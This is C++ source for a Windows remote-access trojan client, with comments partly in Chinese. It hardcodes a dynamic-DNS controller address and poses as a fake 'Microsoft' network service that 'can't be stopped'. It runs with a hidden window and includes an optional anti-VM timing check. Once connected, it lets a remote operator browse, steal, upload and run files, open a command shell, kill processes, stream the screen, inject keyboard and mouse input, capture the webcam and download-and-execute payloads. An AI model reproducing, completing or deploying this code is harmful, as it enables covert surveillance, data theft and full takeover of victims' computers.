#include "stdafx.h"
#include "svchost.h"

#define LxProc
#define LxFile
#define LxScreem
//#define LxUrl
//#define LxDown
//#define LxPower
//#define LxVideo
//#define LxVM
#define Lxform

#define vipid 405

struct MODIFY_DATA
{
	char  strIPFile[128];   //ip file or DNS					0
	char  strVersion[16];   //server version					128
	DWORD dwVipID;          //VIP ID							144
	BOOL  bReplace;         //TRUE-replcae，FALSE-create new		148
	char  strSvrName[32];   //name								149
	char  strSvrDisp[100];  //Display name						181
	char  strSvrDesc[100];  //describe							281
	char  ServerAddr[100];	//Client Addr						381
	int   ServerPort;		//Client port						481
} modify_data =
{
	"lkyfire.vicp.net:80",
	"20170506",
	vipid,
	FALSE,
	"WinNetCenter",
	"Microsoft(R) Multi Protocol Network Control Center",
	"Provides supports for multi network Protocol. This service can't be stopped.",
	"127.0.0.1",
	80,
};

SOCKET MainSocket;
HMODULE DllHandle;
float ScreenRadio = 1;

unsigned long _stdcall resolve(char *host)
{
	ULONG Ip = inet_addr(host);

	if (Ip == INADDR_NONE)
	{
		DbpErr("Host Mode");

		struct hostent *HostInfo = (struct hostent*)gethostbyname(host);

		if (HostInfo == NULL)
		{
			HostInfo = (struct hostent*)gethostbyname(host); //retry
		}

		if (HostInfo == NULL)
		{
			return 0;
		}

		Ip = *(unsigned long *)HostInfo->h_addr;
	}

	return Ip;
}

SOCKET ConnectServer(char Addr[], int Port)
{
	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family = AF_INET;
	LocalAddr.sin_port = htons(Port);
	LocalAddr.sin_addr.S_un.S_addr = resolve(Addr);

	SOCKET hSocket = socket(AF_INET, SOCK_STREAM, 0);

	//int timeout = INFINITE;
	//setsockopt(hSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));

	if (connect(hSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
	{
		MsgErr("Can't Connect to %s:%d", Addr, Port);

		closesocket(hSocket);

		return SOCKET_ERROR;
	}

	TurnonKeepAlive(hSocket, 120);

	return hSocket;
}

inline SOCKET ConnectServer()
{
	return ConnectServer(modify_data.ServerAddr, modify_data.ServerPort);
}

DWORD _stdcall ConnectThread(LPVOID lParam)
{
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);

	MainSocket = ConnectServer();

	if (MainSocket == SOCKET_ERROR)
	{
		MsgErr("Can't Connect");

		return (DWORD)WORKING_STATE::CONNECT_ERR;
	}

	SysInfo m_SysInfo;
	GetSystemInfo(m_SysInfo);
	m_SysInfo.iVipID = modify_data.dwVipID;
	m_SysInfo.bVideo = true; //CVideoCap::IsWebCam();
	lstrcpyA(m_SysInfo.cVersion, modify_data.strVersion);
	EncryptData((unsigned char *)&m_SysInfo, sizeof(SysInfo), modify_data.dwVipID);	//用产品ID号加密

	MsgHead msgHead;
	msgHead.dwCmd = SOCKET_CONNECT;
	msgHead.dwSize = sizeof(SysInfo);

	if (!SendMsg(MainSocket, (char *)&m_SysInfo, &msgHead))
	{
		MsgErr("Can't Send");
		closesocket(MainSocket);
		return (DWORD)WORKING_STATE::REQUEST_ERR;
	}

	char chBuffer[4096];

	while (true)
	{
		if (!RecvMsg(MainSocket, chBuffer, &msgHead))
		{
			MsgErr("Can't Recv");
			shutdown(MainSocket, 0x02);
			closesocket(MainSocket);

			return (DWORD)WORKING_STATE::RECEIVE_ERR;
		}

		switch (msgHead.dwCmd)
		{
		case CMD_FILEMANAGE:
		{
#ifdef LxFile
			CreateThread(NULL, NULL, FileManageThread, NULL, NULL, NULL);
#endif
		}
		break;

		case CMD_PROCESSSTART:
		{
#ifdef LxProc
			CreateThread(NULL, NULL, ProcessThread, NULL, NULL, NULL);
#endif
		}
		break;

		case CMD_SHELLSTART:
		{
			CreateThread(NULL, NULL, ShellThread, NULL, NULL, NULL);
		}
		break;

		case CMD_VIDEOSTART:
		{
#ifdef LxVideo
			CreateThread(NULL, NULL, VideoThread, NULL, NULL, NULL);
#endif
		}
		break;

		case CMD_HEARTBEAT:
		{
			//不处理这里，可以做计数，因为控制端基本也是定时发的
		}
		break;

		case CMD_UNINSTALL:
		{
			shutdown(MainSocket, 0x02);
			closesocket(MainSocket);
			return (DWORD)WORKING_STATE::ON_EXIT;
		}

		case CMD_RESTART:
		{
			shutdown(MainSocket, 0x02);
			closesocket(MainSocket);
			Sleep(200);

			char SelfPath[128];
			GetModuleFileNameA(GetModuleHandle(NULL), SelfPath, 128);
			WinExec(SelfPath, 0);

			return (DWORD)WORKING_STATE::ON_EXIT;
		}

#ifdef LxPower
		case CMD_POWEROFF:	//关机
		{
			SetPrivilege(SE_SHUTDOWN_NAME);
			ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0);
		}
		break;

		case CMD_REBOOT:	//重启
		{
			SetPrivilege(SE_SHUTDOWN_NAME);
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
		}
		break;

		case CMD_LOGOFF:	//注销
		{
			SetPrivilege(SE_SHUTDOWN_NAME);
			ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0);
		}
		break;
#endif

		case CMD_DOWNEXEC:	//下载执行
		{
#ifdef LxDown
			char strUrl[256];
			memset(strUrl, 0, 256);
			lstrcpyn(strUrl, chBuffer, msgHead.dwSize);
			DownExec(strUrl);
#endif
		}
		break;

		case CMD_OPENURL:	//打开网页
		{
#ifdef LxUrl
			char strUrl[256];
			memset(strUrl, 0, 256);
			lstrcpyn(strUrl, chBuffer, msgHead.dwSize);
			OpenUrl(strUrl);
#endif
		}
		break;

#ifdef LxScreem
		case CMD_SCREENSTART:
		{
			DWORD dwSock = msgHead.dwExtend1;	//获取上线的socket == DWORD
			CreateThread(NULL, NULL, ScreenThread, (LPVOID)dwSock, NULL, NULL);
		}
		break;

		case CMD_CTRLALTDEL:	// Ctrl + Alt + del
		{
			WinExec("taskmgr.exe", SW_NORMAL);
		}
		break;

		case CMD_KEYDOWN:	//WM_KEYDOWN
		{
			int nVirtKey = msgHead.dwExtend1;
			//keybd_event((BYTE)nVirtKey, 0, 0, 0);

			INPUT input;
			memset(&input, 0, sizeof(INPUT));
			input.type = INPUT_KEYBOARD;
			input.ki.wVk = nVirtKey;
			SendInput(1, &input, sizeof(INPUT));
		}
		break;

		case CMD_KEYUP:	//WM_KEYUP
		{
			int nVirtKey = msgHead.dwExtend1;
			//keybd_event((BYTE)nVirtKey, 0, KEYEVENTF_KEYUP, 0);

			INPUT input;
			memset(&input, 0, sizeof(INPUT));
			input.type = INPUT_KEYBOARD;
			input.ki.wVk = nVirtKey;
			input.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &input, sizeof(INPUT));
		}
		break;

		case CMD_MOUSEMOVE:	//WM_MOUSEMOVE
		{
			POINT pt;
			pt.x = msgHead.dwExtend1;
			pt.y = msgHead.dwExtend2;
			SetCursorPos(pt.x * ScreenRadio, pt.y * ScreenRadio);
		}
		break;

		case CMD_LBUTTONDOWN:	//WM_LBUTTONDOWN
		{
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
		}
		break;

		case CMD_LBUTTONUP:	//WM_LBUTTONUP
		{
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		}
		break;

		case CMD_LBUTTONDBLCLK:	//WM_LBUTTONDBLCLK
		{
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		}
		break;

		case CMD_RBUTTONDOWN:	//WM_RBUTTONDOWN
		{
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
		}
		break;

		case CMD_RBUTTONUP:	//WM_RBUTTONUP
		{
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
		}
		break;

		case CMD_RBUTTONDBLCLK:	//WM_RBUTTONDBLCLK
		{
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
		}
		break;
#endif
		default:
			break;
		}
	}
}

DWORD _stdcall FileManageThread(LPVOID lParam)
{
	SOCKET FileSocket = ConnectServer();

	if (FileSocket == SOCKET_ERROR)
	{
		return 0;
	}

	MsgHead msgHead;
	char *chBuffer = new char[2048 * 1024];

	//send socket type
	msgHead.dwCmd = SOCKET_FILEMANAGE;
	msgHead.dwSize = 0;
	if (!SendMsg(FileSocket, chBuffer, &msgHead))
	{
		delete[] chBuffer;

		closesocket(FileSocket);
		return 0;//send socket type error
	}

	while (true)
	{
		if (!RecvMsg(FileSocket, chBuffer, &msgHead))
			break;

		switch (msgHead.dwCmd)
		{
		case CMD_FILEDRIVER:
		{
			FileListDirver(chBuffer, &msgHead);
		}
		break;
		case CMD_FILEDIRECTORY:
		{
			FileListDirectory(chBuffer, &msgHead);
		}
		break;
		case CMD_FILEDELETE:
		{
			FileDelete(chBuffer, &msgHead);
		}
		break;
		case CMD_FILEEXEC:
		{
			FileExec(chBuffer, &msgHead);
		}
		break;
		case CMD_FILEPASTE:
		{
			FilePaste(chBuffer, &msgHead);
		}
		break;
		case CMD_FILERENAME:
		{
			FileReName(chBuffer, &msgHead);
		}
		break;
		case CMD_FILEDOWNSTART:
		{
			FileOpt m_FileOpt;
			memcpy(&m_FileOpt, chBuffer, sizeof(m_FileOpt));

			if (CreateThread(NULL, NULL, FileDownThread, (LPVOID)&m_FileOpt, NULL, NULL) != NULL)
				msgHead.dwCmd = CMD_SUCCEED;
			else
				msgHead.dwCmd = CMD_FAILED;
			msgHead.dwSize = 0;
		}
		break;
		case CMD_FILEUPSTART:
		{
			FileOpt m_FileOpt;
			memcpy(&m_FileOpt, chBuffer, sizeof(m_FileOpt));

			if (CreateThread(NULL, NULL, FileUpThread, (LPVOID)&m_FileOpt, NULL, NULL) != NULL)
				msgHead.dwCmd = CMD_SUCCEED;
			else
				msgHead.dwCmd = CMD_FAILED;
			msgHead.dwSize = 0;
		}
		break;
		default:
		{
			msgHead.dwCmd = CMD_INVALID;
			msgHead.dwSize = 0;
		}
		break;
		}

		if (!SendMsg(FileSocket, chBuffer, &msgHead))
			break;
	}

	delete[] chBuffer;

	shutdown(FileSocket, 0);
	closesocket(FileSocket);

	return 0;
}

DWORD _stdcall ScreenThread(LPVOID lParam)
{
	DWORD dwSock = (DWORD)lParam;

	SOCKET ScreenSocket = ConnectServer();

	if (ScreenSocket == SOCKET_ERROR)
	{
		MsgErr("Screen Thread connect");
		return 0;
	}

	//设置发送缓冲区,有利于屏幕传输
	int bufSize = 65536; //64KB
	setsockopt(ScreenSocket, SOL_SOCKET, SO_SNDBUF, (char*)&bufSize, sizeof(bufSize));
	//int bNodelay = 1;
	//setsockopt(ScreenSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法

	MsgHead msgHead;

	msgHead.dwCmd = SOCKET_SCREEN;
	msgHead.dwSize = 0;
	msgHead.dwExtend1 = dwSock;

	//Get Screen Color
	if (!SendMsg(ScreenSocket, NULL, &msgHead) || !RecvMsg(ScreenSocket, NULL, &msgHead))
	{
		shutdown(ScreenSocket, 0);
		closesocket(ScreenSocket);
		return 0; //send socket type error
	}

	int nColor = msgHead.dwExtend1;

	////////////////////////////////////////
	XScreenXor m_ScreenXor;

	m_ScreenXor.SetColor(nColor);
	m_ScreenXor.InitGlobalVar();

	ScreenRadio = m_ScreenXor.Radio; //Radio info for MouseMove Msg

	msgHead.dwCmd = SOCKET_SCREEN;
	msgHead.dwSize = 0;
	msgHead.dwExtend1 = m_ScreenXor.GetBmpSize();
	msgHead.dwExtend2 = m_ScreenXor.GetInfoSize();
	//发送位图信息
	if (!SendMsg(ScreenSocket, NULL, &msgHead))
	{
		shutdown(ScreenSocket, 0);
		closesocket(ScreenSocket);
		return 0;//send socket type error
	}

	DWORD dwFrameID = 0;
	DWORD lenthUncompress = m_ScreenXor.GetBmpSize();
	DWORD lenthCompress = compressBound(lenthUncompress); //(DWORD)((lenthUncompress+12)*1.1);
	BYTE* pDataCompress = new BYTE[lenthCompress];

	lenthCompress = compressBound(lenthUncompress); //(unsigned long)((lenthUncompress+12)*1.1);
	m_ScreenXor.CaputreFrameFirst(0);
	Sleep(15);
	compress(pDataCompress, &lenthCompress, m_ScreenXor.GetBmpData(), lenthUncompress);

	msgHead.dwCmd = dwFrameID++;              //当前帧号
	msgHead.dwSize = lenthCompress;            //传输的数据长度
	msgHead.dwExtend1 = m_ScreenXor.GetBmpSize(); //原始长度
	msgHead.dwExtend2 = lenthCompress;            //压缩后长度

	BOOL bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead);

	while (bNotStop)
	{
		lenthCompress = compressBound(lenthUncompress); //(unsigned long)((lenthUncompress+12)*1.1);
		m_ScreenXor.CaputreFrameNext(dwFrameID);
		Sleep(15);
		compress(pDataCompress, &lenthCompress, m_ScreenXor.GetBmpData(), lenthUncompress);

		msgHead.dwCmd = dwFrameID++;              //当前帧号
		msgHead.dwSize = lenthCompress;            //传输的数据长度
		msgHead.dwExtend1 = m_ScreenXor.GetBmpSize(); //原始长度
		msgHead.dwExtend2 = lenthCompress;            //压缩后长度

		bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead);
		Dbp("Size: %d", lenthCompress);

		Sleep(125);
	}

	//Release Mem and Handle
	shutdown(ScreenSocket, 0);
	closesocket(ScreenSocket);
	delete[] pDataCompress;

	return 0;
}

#ifdef LxVideo
DWORD _stdcall VideoThread(LPVOID lParam)
{
	SOCKET VideoSocket = ConnectServer();
	if (VideoSocket == SOCKET_ERROR)
	{
		return 0;//connect error
	}
	else
	{
		//设置发送缓冲区,有利于视频传输
		int rcvbuf = 65536; //64KB
		int rcvbufsize = sizeof(int);
		setsockopt(VideoSocket, SOL_SOCKET, SO_SNDBUF, (char*)&rcvbuf, rcvbufsize);
		int bNodelay = 1;
		setsockopt(VideoSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法
	}

	MsgHead msgHead;
	//send socket type
	msgHead.dwCmd = SOCKET_VIDEOCAP;
	msgHead.dwSize = 0;
	if (!SendMsg(VideoSocket, NULL, &msgHead))
	{
		shutdown(VideoSocket, 0);
		closesocket(VideoSocket);
		return 0;//send socket type error
	}

	///////////////////////////////////////////////
	//Send BITMAPINFO or error code
	if (!CVideoCap::IsWebCam())    //设备不存在或正在使用
	{
		msgHead.dwCmd = 1;
		msgHead.dwSize = 0;
		SendMsg(VideoSocket, NULL, &msgHead);
		shutdown(VideoSocket, 0x02);
		closesocket(VideoSocket);
		return 1;//send socket type error
	}

	CVideoCap m_Cap;
	if (!m_Cap.Initialize())   //设备初始化失败
	{
		msgHead.dwCmd = 2;
		msgHead.dwSize = 0;
		SendMsg(VideoSocket, NULL, &msgHead);
		shutdown(VideoSocket, 0x02);
		closesocket(VideoSocket);
		return 2;
	}

	msgHead.dwCmd = 0;
	msgHead.dwSize = sizeof(BITMAPINFOHEADER);
	if (!SendMsg(VideoSocket, (char*)&(m_Cap.m_lpbmi->bmiHeader), &msgHead))
	{
		shutdown(VideoSocket, 0);
		closesocket(VideoSocket);
		return 3;//send socket type error
	}

	DWORD dwFrameID = 0, dwLastSend;
	BOOL  bNotStop = TRUE;
	DWORD lenthUncompress = m_Cap.m_lpbmi->bmiHeader.biSizeImage - 5;//为啥-5？？
	DWORD lenthCompress = (unsigned long)((lenthUncompress + 12)*1.1);
	BYTE* pDataCompress = new BYTE[lenthCompress];

	while (bNotStop)
	{
		dwLastSend = GetTickCount();//被卡巴杀

		lenthCompress = (unsigned long)((lenthUncompress + 12)*1.1);                   //这个不能少
		::compress(pDataCompress,                                   //压缩数据
			&lenthCompress,
			(BYTE*)m_Cap.GetDIB(),
			lenthUncompress);

		msgHead.dwCmd = dwFrameID++;            //帧号
		msgHead.dwSize = lenthCompress;          //传输的数据长度
		msgHead.dwExtend1 = lenthUncompress;        //未压缩数据长度
		msgHead.dwExtend2 = lenthCompress;          //压缩后数据长度

		bNotStop = SendMsg(VideoSocket, (char*)pDataCompress, &msgHead); //发送数据

		if ((GetTickCount() - dwLastSend) < 100)
			Sleep(80);
	}

	if (pDataCompress != NULL)
		delete[] pDataCompress;

	return 10;
}
#endif

DWORD _stdcall ProcessThread(LPVOID lParam)
{
	SOCKET ProcessSocket = ConnectServer();
	if (ProcessSocket == SOCKET_ERROR)	//connect error
	{
		return 0;
	}

	MsgHead msgHead;
	char chBuffer[32 * 1024]; //数据交换区

	msgHead.dwCmd = SOCKET_PROCESS;
	msgHead.dwSize = 0;
	if (!SendMsg(ProcessSocket, chBuffer, &msgHead))
	{
		shutdown(ProcessSocket, 0);
		closesocket(ProcessSocket);
		return 0;//send socket type error
	}

	GrantPrivilege();

	while (true)
	{
		if (!RecvMsg(ProcessSocket, chBuffer, &msgHead))
			break;

		switch (msgHead.dwCmd)
		{
		case CMD_PROCESSLIST:
		{
			ProcessList(chBuffer, &msgHead);
		}
		break;
		case CMD_PROCESSKILL:
		{
			ProcessKill(chBuffer, &msgHead);
		}
		break;
		default:
		{
			msgHead.dwCmd = CMD_INVALID;
			msgHead.dwSize = 0;
		}
		break;
		}

		if (!SendMsg(ProcessSocket, chBuffer, &msgHead))
			break;
	}

	shutdown(ProcessSocket, 0);
	closesocket(ProcessSocket);
	return 0;
}

DWORD _stdcall ShellThread(LPVOID lParam)
{
	SOCKET ShellSocket = ConnectServer();
	if (ShellSocket == SOCKET_ERROR)
	{
		return 0;
	}

	MsgHead msgHead;
	char *chBuffer = new char[512 * 1024];

	msgHead.dwCmd = SOCKET_CMDSHELL;
	msgHead.dwSize = 0;
	if (!SendMsg(ShellSocket, chBuffer, &msgHead))
	{
		shutdown(ShellSocket, 0x02);
		closesocket(ShellSocket);
		return 0; //send socket type error
	}

	while (true)
	{
		if (!RecvMsg(ShellSocket, chBuffer, &msgHead))
			break;

		switch (msgHead.dwCmd)
		{
		case CMD_SHELLRUN:
		{
			DOSShell(chBuffer, &msgHead);
		}
		break;
		default:
			break;
		}

		if (!SendMsg(ShellSocket, chBuffer, &msgHead))
			break;
	}

	delete[] chBuffer;

	shutdown(ShellSocket, 0);
	closesocket(ShellSocket);
	return 0;
}

DWORD _stdcall FileDownThread(LPVOID lParam)
{
	FileOpt m_FileOpt;
	memcpy(&m_FileOpt, (FileOpt*)lParam, sizeof(FileOpt));

	SOCKET FileSocket = ConnectServer();
	if (FileSocket == SOCKET_ERROR)
	{
		return 0;
	}

	MsgHead msgHead;
	msgHead.dwCmd = SOCKET_FILEDOWN;
	msgHead.dwSize = 0;
	if (!SendMsg(FileSocket, NULL, &msgHead))
	{
		shutdown(FileSocket, 0);
		closesocket(FileSocket);
		return 0;//send socket type error
	}

	DWORD  dwDownFileSize, dwBytes;
	BYTE   SendBuffer[4096];

	//get download data
	HANDLE hDownFile = CreateFileA(m_FileOpt.cScrFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hDownFile == INVALID_HANDLE_VALUE)
		dwDownFileSize = 0; //CMD_READFILEEOR
	else
		dwDownFileSize = GetFileSize(hDownFile, NULL);

	m_FileOpt.iSize = dwDownFileSize;
	//send file message
	if (send(FileSocket, (char *)&m_FileOpt, sizeof(FileOpt), 0) <= 0 || dwDownFileSize <= 0)
	{
		shutdown(FileSocket, 0x02);
		closesocket(FileSocket);
		return 1;//send socket type error
	}

	while (dwDownFileSize > 0)
	{
		if (!ReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL))
		{
			break;
		}

		if (send(FileSocket, (char*)&SendBuffer, dwBytes, 0) <= 0)
			break;

		dwDownFileSize -= dwBytes;
	}

	CloseHandle(hDownFile);
	shutdown(FileSocket, 0x02);
	closesocket(FileSocket);

	return 10;
}

DWORD _stdcall FileUpThread(LPVOID lParam)
{
	FileOpt m_FileOpt;
	memcpy(&m_FileOpt, (FileOpt*)lParam, sizeof(FileOpt));

	SOCKET FileSocket = ConnectServer();
	if (FileSocket == SOCKET_ERROR)
	{
		return 0;
	}

	int iOutTime = 60000;
	setsockopt(FileSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&iOutTime, sizeof(int));

	MsgHead msgHead;
	msgHead.dwCmd = SOCKET_FILEUP;
	msgHead.dwSize = 0;
	if (!SendMsg(FileSocket, NULL, &msgHead))
	{
		shutdown(FileSocket, 0);
		closesocket(FileSocket);
		return 0;//send socket type error
	}

	DWORD dwUpFileSize, dwBufSize = 4096, dwBytes;
	BYTE RecvBuffer[4096];

	//get download data
	HANDLE hUpFile = CreateFileA(m_FileOpt.cScrFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hUpFile == INVALID_HANDLE_VALUE)//CMD_READFILEEOR
		dwUpFileSize = 0;
	else
		dwUpFileSize = 100;

	m_FileOpt.iSize = dwUpFileSize;
	//send file message
	if (send(FileSocket, (char *)&m_FileOpt, sizeof(FileOpt), 0) <= 0 || dwUpFileSize <= 0)
	{
		CloseHandle(hUpFile);
		shutdown(FileSocket, 0x02);
		closesocket(FileSocket);

		return 1;//send socket type error
	}

	while (true)
	{
		int nRet = recv(FileSocket, (char*)&RecvBuffer, dwBufSize, 0);
		if (nRet <= 0)
			break;
		WriteFile(hUpFile, RecvBuffer, nRet, &dwBytes, NULL);
	}

	CloseHandle(hUpFile);
	shutdown(FileSocket, 0x02);
	closesocket(FileSocket);

	return 10;
}

DWORD WINAPI RoutineMain(LPVOID lp)
{
	TCHAR ModulePath[MAX_PATH * 2];
	GetModuleFileName(DllHandle, ModulePath, sizeof(ModulePath));
	CreateFile(ModulePath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

#ifdef LxScreem
	OpenUserDesktop();
#endif

	if (lp != NULL)
	{
		memcpy(&modify_data, lp, sizeof(MODIFY_DATA));
	}
	else
	{
		modify_data.ServerPort = 80;
		strcpy(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
		//lstrcpy(modify_data.ServerAddr, "lkyfire.vicp.net");	//192.168.1.145
	}

	DWORD state = (DWORD)WORKING_STATE::CONNECT_ERR;

	while (true)
	{
		__try
		{
			state = ConnectThread(NULL);
		}
		__except (1)
		{
			MsgErr("RoutineMain %d", state);
		}

		if (state == (DWORD)WORKING_STATE::CONNECT_ERR)
		{
			Sleep(30 * 1000);
		}
		else if (state == (DWORD)WORKING_STATE::REQUEST_ERR)
		{
			Sleep(30 * 1000);
		}
		else if (state == (DWORD)WORKING_STATE::RECEIVE_ERR)
		{
			Sleep(30 * 1000);
		}
		else if (state == (DWORD)WORKING_STATE::ON_EXIT)
		{
			Dbp("Exit Request");
			return (DWORD)WORKING_STATE::ON_EXIT;
		}

		Sleep(1000);
	}
}

#ifndef DLLBUILD
int APIENTRY _tWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR lpCmdLine,
	_In_ int nShowCmd
)
{
#ifdef Lxform
	HWND hwnd = CreateWindowExW(
		WS_EX_APPWINDOW,
		L"#32770",
		L"WindowsNet",
		WS_OVERLAPPEDWINDOW,
		0,
		0,
		100,
		100,
		HWND_DESKTOP,
		NULL,
		hInstance,
		NULL
	);

	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);
#endif

#ifdef LxVM
	_asm
	{
		RDTSC
		xchg    ecx, eax
		RDTSC
		sub     eax, ecx
		cmp     eax, 0FFh
		jl      OK
		xor     eax, eax
		push    eax
		call    ExitProcess
	}
OK:
#endif

	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);

	WSADATA lpWSAData;
	WSAStartup(MAKEWORD(2, 2), &lpWSAData);

	RoutineMain(0);

	WSACleanup();

	return 0;
}

#else

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		DllHandle = hModule;

		DisableThreadLibraryCalls(hModule);
		//CloseHandle(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RoutineMain, NULL, 0, NULL));
	}
	else if (ul_reason_for_call == DLL_PROCESS_DETACH)
	{

	}

	return true;
}

#endif
